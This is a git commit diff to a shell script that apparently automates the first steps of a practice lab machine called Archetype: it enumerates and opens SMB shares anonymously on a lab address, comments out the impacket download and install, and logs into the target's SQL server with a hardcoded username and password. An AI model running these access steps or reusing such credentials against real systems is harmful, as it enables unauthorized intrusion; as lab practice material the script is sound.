2a747250bd1a910c1ec522e5d68bebf7de873253
root <root@localhost.localdomain>
2020-05-07 06:53:52 +0530

    Update Structure
    Signed-off-by: root <root@localhost.localdomain>

--- starting-point/Archetype/start.sh
+++ starting-point/Archetype/start.sh
@@ -10,16 +10,17 @@ smbclient -N -L \\\\10.10.10.27\\
 echo "Opening backups..."
 smbclient -N \\\\10.10.10.27\\backups
 
-echo "Downloading impacket..."
-wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz && tar -xvf impacket-0.9.21.tar.gz
-cd impacket-0.9.21/
+#echo "Downloading impacket..."
+#wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz
+#tar -xvf ../impacket-0.9.21.tar.gz
+#cd ../impacket-0.9.21/
 
-echo "Installing impacket..."
-pip3 install .
-cd examples
+#echo "Installing impacket..."
+#pip3 install .
+#cd examples
 
-echo "Fixing python..."
-find mssqlclient.py -type f -exec sed -i 's/python/python3/g' {} \;
+#echo "Fixing python..."
+#find mssqlclient.py -type f -exec sed -i 's/python/python3/g' {} \;
 
 echo "Logging in to SQL database..."
 ./mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
